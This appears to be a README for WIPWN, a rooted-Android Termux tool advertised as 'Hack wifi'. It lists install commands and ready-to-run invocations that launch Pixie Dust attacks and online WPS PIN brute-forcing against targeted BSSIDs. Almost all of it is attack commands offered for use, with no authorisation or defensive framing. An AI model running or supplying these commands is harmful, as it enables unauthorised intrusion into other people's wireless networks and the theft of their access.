# WIPWN
Hack wifi using termux (rooted)

### Installation :

```bash
pkg update && pkg upgrade -y
pkg install root-repo -y
pkg install git tsu python termux-api wpa-supplicant pixiewps iw -y
git clone https://github.com/illusionghost3/wipwn
cd wipwn
chmod +x main.py
```

#### Help : `sudo python main --help`
#### Example : `sudo python main.py -i wlan0 -K`

#### Note: 
+ **First turn off your Wifi.**
+ **Turn on Hotspot.**
+ **Turn on Location.**
- Show avaliable networks and start Pixie Dust attack on a specified network.
- `sudo python main.py -i wlan0 -K`
- - Start Pixie Dust attack on a specified BSSID:
`sudo python main.py -i wlan0 -b 00:91:4C:C3:AC:28 -K`
- Launch online WPS bruteforce with the specified first half of the PIN:
- `sudo python main.py -i wlan0 -b 50:0F:F5:B0:08:05 -B -p 1234`
### Troubleshooting
**"Device or resource busy (-16)" - Turn on Wifi and Then Turn off Wifi.**


### Thanks For Star🙏👨‍💻

[![Stargazers repo](https://reporoster.com/stars/illusionghost3/wipwn)](https://github.com/illusionghost3/wipwn/stargazers)

### Thanks For Fork 🙏👨‍💻

[![Forkers repo](https://reporoster.com/forks/illusionghost3/wipwn)](https://github.com/illusionghost3/wipwn/network/members)
